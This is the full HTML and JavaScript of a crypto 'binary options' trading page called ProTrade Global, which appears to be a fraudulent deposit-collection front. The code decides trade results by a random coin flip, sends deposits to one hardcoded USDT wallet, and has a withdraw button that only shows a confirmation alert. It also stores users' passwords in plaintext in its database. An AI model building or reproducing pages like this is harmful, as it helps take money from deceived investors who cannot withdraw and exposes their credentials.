<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>ProTrade Global | Elite Terminal</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-auth-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-firestore-compat.js"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;800&display=swap');
        body { background: #05070a; color: #e2e8f0; font-family: 'Plus Jakarta Sans', sans-serif; overflow: hidden; height: 100dvh; margin: 0; }
        .glass-card { background: rgba(17, 24, 39, 0.9); backdrop-filter: blur(12px); border: 1px solid rgba(255,255,255,0.1); }
        .btn-grad-green { background: linear-gradient(135deg, #22c55e 0%, #15803d 100%); }
        .btn-grad-red { background: linear-gradient(135deg, #ef4444 0%, #b91c1c 100%); }
        .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.9); z-index: 999; align-items: center; justify-content: center; }
        .auth-input { background: #1a1f29; border: 1px solid #2d3748; padding: 12px; border-radius: 8px; width: 100%; color: white; font-size: 14px; outline: none; }
        #appTerminal { display: none; height: 100dvh; flex-direction: column; padding: 8px; }
        
        /* Fixed Tab Buttons */
        .tab-btn { padding: 10px; font-weight: bold; font-size: 14px; flex: 1; text-align: center; cursor: pointer; border-radius: 8px; transition: 0.3s; }
        .tab-btn.active { background: #2d3748; color: white; }
        .tab-btn:not(.active) { color: #64748b; }

        /* Timer Badge */
        .timer-badge { position: absolute; bottom: 15px; right: 15px; background: #eab308; color: black; padding: 8px 15px; border-radius: 50px; font-weight: 800; font-size: 14px; display: none; z-index: 50; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
        
        /* Fancy Result Card */
        .result-card { background: #1a1f2e; border-radius: 30px; padding: 35px; width: 300px; text-align: center; border: 1px solid rgba(255,255,255,0.1); box-shadow: 0 20px 50px rgba(0,0,0,0.5); }
    </style>
</head>
<body>

    <div id="authSection" class="h-full flex items-center justify-center p-4">
        <div class="glass-card w-full max-w-sm p-6 rounded-3xl">
            <h1 class="text-2xl font-extrabold text-center mb-6 uppercase tracking-tight">ProTrade</h1>
            
            <div class="flex bg-black/40 p-1 rounded-xl mb-6">
                <div id="loginTab" onclick="switchTab('login')" class="tab-btn">Login</div>
                <div id="regTab" onclick="switchTab('reg')" class="tab-btn active">Registration</div>
            </div>

            <div class="space-y-4">
                <div id="regFields">
                    <select class="auth-input mb-4"><option>Pakistan</option><option>India</option></select>
                    <select class="auth-input mb-4"><option>USDT</option></select>
                </div>
                <input type="email" id="userEmail" placeholder="Email" class="auth-input">
                <input type="password" id="userPass" placeholder="Password" class="auth-input">
                <button onclick="handleAuth()" id="authBtn" class="w-full py-3 bg-blue-600 text-white font-black rounded-xl text-sm uppercase">Registration</button>
            </div>
        </div>
    </div>

    <div id="appTerminal">
        <header class="flex justify-between items-center mb-2 px-1">
            <div class="flex items-center gap-2">
                <div onclick="showM('settingsM')" class="w-9 h-9 rounded-full bg-yellow-500 flex items-center justify-center text-black font-bold uppercase cursor-pointer" id="userInitial">?</div>
                <div>
                    <p class="text-[8px] text-gray-400 font-bold uppercase">REAL BALANCE</p>
                    <h1 id="balanceDisp" class="text-xl font-extrabold text-white tracking-tight">$0.00</h1>
                </div>
            </div>
            <div class="flex gap-2">
                <button onclick="showM('depM')" class="bg-yellow-500 text-black px-3 py-1.5 rounded-lg text-[10px] font-black uppercase">DEPOSIT</button>
                <button onclick="showM('witM')" class="bg-white text-black px-3 py-1.5 rounded-lg text-[10px] font-black uppercase">WITHDRAW</button>
            </div>
        </header>

        <div class="px-1 mb-2">
            <div class="bg-white/5 border border-white/10 rounded-xl px-3 py-2 flex items-center justify-between">
                <span class="text-[9px] text-gray-500 font-bold uppercase">Select Asset</span>
                <select id="assetSelect" onchange="updateAsset(this.value)" class="bg-transparent text-yellow-500 font-black text-xs outline-none">
                    <option value="BINANCE:BTCUSDT">BTC/USDT</option>
                    <option value="BINANCE:ETHUSDT">ETH/USDT</option>
                    <option value="BINANCE:SOLUSDT">SOL/USDT</option>
                    <option value="FX:EURUSD">EUR/USD</option>
                    <option value="OANDA:XAUUSD">GOLD</option>
                </select>
            </div>
        </div>

        <main class="relative flex-grow rounded-2xl overflow-hidden border border-gray-800 bg-black mb-2">
            <div id="tv_chart" class="h-full w-full"></div>
            <div id="tradeTimer" class="timer-badge">‚è± <span id="timerText">00:00</span></div>
        </main>

        <footer class="glass-card p-3 rounded-2xl">
            <div class="grid grid-cols-2 gap-3 mb-3">
                <div class="bg-[#0f141e] px-4 py-2 rounded-xl border border-white/5">
                    <span class="text-[9px] text-gray-500 font-bold uppercase block mb-0.5">AMOUNT</span>
                    <input id="tradeAmt" type="number" value="10" class="bg-transparent outline-none font-bold text-white w-full">
                </div>
                <div class="bg-[#0f141e] px-4 py-2 rounded-xl border border-white/5">
                    <span class="text-[9px] text-gray-500 font-bold uppercase block mb-0.5">TIME</span>
                    <select id="duration" class="bg-transparent font-bold text-white w-full outline-none">
                        <option value="5">5 Sec</option>
                        <option value="15">15 Sec</option>
                        <option value="30">30 Sec</option>
                        <option value="60">1 Min</option>
                        <option value="300">5 Min</option>
                    </select>
                </div>
            </div>
            <div class="grid grid-cols-2 gap-3">
                <button onclick="initTrade('UP')" class="btn-grad-green h-14 rounded-2xl font-black text-white text-sm uppercase">CALL</button>
                <button onclick="initTrade('DOWN')" class="btn-grad-red h-14 rounded-2xl font-black text-white text-sm uppercase">PUT</button>
            </div>
        </footer>
    </div>

    <div id="resultM" class="modal">
        <div id="resultContent" class="result-card"></div>
    </div>

    <div id="depM" class="modal"><div class="glass-card p-6 rounded-3xl w-[90%] max-w-sm text-center"> <div id="depStep0"> <h2 class="text-lg font-bold mb-4 uppercase text-yellow-500">Deposit Funds</h2> <input type="number" id="depAmountInput" placeholder="Amount ($)" class="auth-input mb-4 text-center"> <button onclick="goToDepStep1()" class="w-full py-3 bg-yellow-500 text-black font-black rounded-xl text-xs uppercase">Next</button> <button onclick="hideM('depM')" class="mt-4 text-gray-500 text-[10px] font-bold uppercase block w-full">Cancel</button> </div> <div id="depStep1" class="hidden"> <h2 class="text-lg font-bold mb-4 uppercase text-yellow-500">Send USDT</h2> <div class="bg-white p-2 rounded-xl mb-4 w-40 mx-auto"> <img src="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=TAaTmYha48Pbft4aJn1RGyKmVoQZKuLArM"> </div> <div class="bg-black/50 p-2 rounded-xl mb-4 text-[10px] break-all text-white">TAaTmYha48Pbft4aJn1RGyKmVoQZKuLArM</div> <button onclick="showDepForm()" class="w-full py-3 bg-yellow-500 text-black font-black rounded-xl text-xs uppercase">I Have Paid</button> </div> <div id="depStep2" class="hidden"> <input type="text" id="userTg" placeholder="Telegram ID" class="auth-input mb-3"> <input type="text" id="txid" placeholder="TXID" class="auth-input mb-3"> <button onclick="finalSubmitDeposit()" class="w-full py-3 bg-blue-600 text-white font-black rounded-xl text-xs uppercase">Submit</button> </div> </div></div>
    <div id="witM" class="modal"><div class="glass-card p-6 rounded-3xl w-[90%] max-w-sm"><h2 class="text-lg font-bold mb-4 uppercase text-center text-yellow-500">Withdraw</h2><input type="text" id="witAddress" placeholder="Wallet Address" class="auth-input mb-3"><input type="number" id="witAmount" placeholder="Amount ($)" class="auth-input mb-3"><button onclick="handleWithdraw()" class="w-full py-3 bg-yellow-500 text-black font-black rounded-xl text-xs uppercase">Request</button><button onclick="hideM('witM')" class="w-full text-center text-gray-500 text-[10px] font-bold uppercase mt-2">Cancel</button></div></div>
    <div id="settingsM" class="modal"><div class="glass-card p-6 rounded-3xl w-[90%] max-w-sm"><h2 class="text-lg font-bold mb-6 uppercase text-center text-yellow-500">Settings</h2><input type="text" id="settingEmail" class="auth-input mb-3 opacity-70" readonly><button onclick="auth.signOut()" class="w-full py-3 bg-red-600/20 text-red-500 border border-red-600/30 font-black rounded-xl text-xs uppercase">Logout</button><button onclick="hideM('settingsM')" class="w-full text-center text-gray-500 text-[10px] font-bold uppercase mt-3">Close</button></div></div>

    <script type="text/javascript" src="https://s3.tradingview.com/tv.js"></script>
    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyAySRA1YSpTpmC8WjnKmDhnNMHkEmkeP50",
            authDomain: "waqas-47f30.firebaseapp.com",
            projectId: "waqas-47f30",
            storageBucket: "waqas-47f30.appspot.com",
            messagingSenderId: "374104279093",
            appId: "1:374104279093:web:6e1844b60456c700940364"
        };
        firebase.initializeApp(firebaseConfig);
        const auth = firebase.auth();
        const db = firebase.firestore();
        let userData = null;
        let mode = 'reg';
        let currentSymbol = 'BINANCE:BTCUSDT';
        let tradeInterval = null;

        // FIXED TAB SWITCHING
        function switchTab(t) {
            mode = t;
            document.getElementById('loginTab').className = (t === 'login' ? 'tab-btn active' : 'tab-btn');
            document.getElementById('regTab').className = (t === 'reg' ? 'tab-btn active' : 'tab-btn');
            document.getElementById('regFields').style.display = (t === 'login' ? 'none' : 'block');
            document.getElementById('authBtn').innerText = (t === 'login' ? 'Login' : 'Registration');
        }

        async function handleAuth() {
            const email = document.getElementById('userEmail').value.trim();
            const pass = document.getElementById('userPass').value.trim();
            if(!email || !pass) return alert("Fill all details!");
            try {
                if(mode === 'reg') {
                    const res = await auth.createUserWithEmailAndPassword(email, pass);
                    await db.collection('users').doc(res.user.uid).set({ email, password: pass, balance: 0.00, status: 'active' });
                    alert("Account Created!");
                    switchTab('login');
                } else { await auth.signInWithEmailAndPassword(email, pass); }
            } catch(e) { alert(e.message); }
        }

        auth.onAuthStateChanged(user => {
            if(user) {
                db.collection('users').doc(user.uid).onSnapshot(doc => {
                    userData = doc.data();
                    document.getElementById('balanceDisp').innerText = "$" + (userData?.balance || 0).toFixed(2);
                    document.getElementById('userInitial').innerText = user.email.charAt(0).toUpperCase();
                    document.getElementById('settingEmail').value = user.email;
                    document.getElementById('authSection').style.display = 'none';
                    document.getElementById('appTerminal').style.display = 'flex';
                    loadChart();
                });
            } else {
                document.getElementById('authSection').style.display = 'flex';
                document.getElementById('appTerminal').style.display = 'none';
            }
        });

        function loadChart() {
            new TradingView.widget({ "autosize": true, "symbol": currentSymbol, "interval": "1", "theme": "dark", "container_id": "tv_chart", "hide_top_toolbar": true, "backgroundColor": "#05070a", "hide_side_toolbar": true });
        }
        function updateAsset(val) { currentSymbol = val; loadChart(); }

        // TRADING LOGIC WITH TIMER & POPUP
        async function initTrade(type) {
            const amt = parseFloat(document.getElementById('tradeAmt').value);
            const dur = parseInt(document.getElementById('duration').value);
            if(!userData || amt > userData.balance || amt <= 0) return alert("Insufficient Balance!");

            await db.collection('users').doc(auth.currentUser.uid).update({ balance: firebase.firestore.FieldValue.increment(-amt) });

            // Start Visual Timer
            const timerEl = document.getElementById('tradeTimer');
            const textEl = document.getElementById('timerText');
            timerEl.style.display = 'block';
            let timeLeft = dur;

            if(tradeInterval) clearInterval(tradeInterval);
            tradeInterval = setInterval(() => {
                let m = Math.floor(timeLeft / 60);
                let s = timeLeft % 60;
                textEl.innerText = `${m.toString().padStart(2, '0')}:${s.toString().padStart(2, '0')}`;
                if(timeLeft <= 0) {
                    clearInterval(tradeInterval);
                    timerEl.style.display = 'none';
                    finishTrade(amt);
                }
                timeLeft--;
            }, 1000);
        }

        async function finishTrade(amt) {
            const isWin = Math.random() > 0.5;
            const profitAmt = amt * 1.82;
            const content = document.getElementById('resultContent');
            
            if(isWin) {
                await db.collection('users').doc(auth.currentUser.uid).update({ balance: firebase.firestore.FieldValue.increment(profitAmt) });
                content.innerHTML = `<div class="text-6xl mb-4">üèÜ</div><h2 class="text-green-500 font-black text-2xl uppercase">PROFIT</h2><h1 class="text-4xl font-extrabold text-white mt-2">+$${profitAmt.toFixed(2)}</h1><button onclick="hideM('resultM')" class="w-full bg-[#252a3d] text-white font-bold py-4 rounded-xl mt-8 uppercase text-sm">Continue</button>`;
            } else {
                content.innerHTML = `<div class="text-6xl mb-4">‚ùå</div><h2 class="text-red-500 font-black text-2xl uppercase">LOSS</h2><h1 class="text-4xl font-extrabold text-white mt-2">-$${amt.toFixed(2)}</h1><button onclick="hideM('resultM')" class="w-full bg-[#252a3d] text-white font-bold py-4 rounded-xl mt-8 uppercase text-sm">Continue</button>`;
            }
            showM('resultM');
        }

        // Helpers
        function showM(id) { document.getElementById(id).style.display = 'flex'; }
        function hideM(id) { document.getElementById(id).style.display = 'none'; }
        function goToDepStep1() { document.getElementById('depStep0').classList.add('hidden'); document.getElementById('depStep1').classList.remove('hidden'); }
        function showDepForm() { document.getElementById('depStep1').classList.add('hidden'); document.getElementById('depStep2').classList.remove('hidden'); }
        async function finalSubmitDeposit() { alert("Submitted!"); hideM('depM'); }
        async function handleWithdraw() { alert("Request Sent!"); hideM('witM'); }
    </script>
</body>
</html>
